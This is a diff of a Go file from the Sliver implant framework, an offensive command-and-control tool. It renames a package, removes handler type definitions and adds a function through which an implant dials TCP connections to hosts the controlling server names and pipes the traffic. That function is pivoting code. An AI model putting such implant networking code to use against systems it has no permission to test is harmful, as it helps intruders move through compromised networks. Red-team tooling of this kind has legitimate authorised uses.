@@ -1,4 +1,4 @@
-package handlers
+package comm
 
 /*
 	Sliver Implant Framework
@@ -19,24 +19,32 @@ package handlers
 */
 
 import (
+	"io"
+	"net"
+
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/sliver/transports"
 )
 
-// RPCResponse - Request/response callback
-type RPCResponse func([]byte, error)
+// handleTCP - A connection coming from the server is destined to one of the implant's networks.
+// Forge local and/or remote TCP addresses and pass them to the dialer. Pipe the connection.
+func handleTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
+	var srcAddr *net.TCPAddr
+	if info.LHost != "" || info.LPort == 0 {
+		srcAddr = &net.TCPAddr{
+			IP:   net.ParseIP(info.LHost),
+			Port: int(info.LPort),
+		}
+	}
 
-// RPCHandler - Request handler
-type RPCHandler func([]byte, RPCResponse)
+	dstAddr := &net.TCPAddr{
+		IP:   net.ParseIP(info.RHost),
+		Port: int(info.RPort),
+	}
 
-// SpecialHandler - Handlers that need to interact directly with the transport
-type SpecialHandler func([]byte, *transports.Connection) error
-
-// TunnelHandler - Tunnel related functionality for duplex connections
-type TunnelHandler func(*sliverpb.Envelope, *transports.Connection)
-
-// PivotHandler - Handler related to pivoting
-type PivotHandler func(*sliverpb.Envelope, *transports.Connection)
-
-// RouteHandler - Handler for managing network routes
-type RouteHandler func(*sliverpb.Envelope, *transports.Connection)
+	dst, err := net.DialTCP("tcp", srcAddr, dstAddr)
+	if err != nil {
+		return err
+	}
+	transport(src, dst)
+	return nil
+}
